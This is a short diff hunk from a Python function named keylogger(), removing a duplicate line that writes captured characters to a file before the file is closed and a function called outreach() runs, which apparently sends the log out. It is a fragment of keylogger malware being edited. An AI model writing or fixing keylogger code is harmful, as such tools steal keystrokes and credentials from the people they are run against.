@@ -41,7 +41,6 @@ def keylogger():
                 if char == i:
                     file.write(char)
             
-            file.write(char)
             file.close()
             outreach()
             
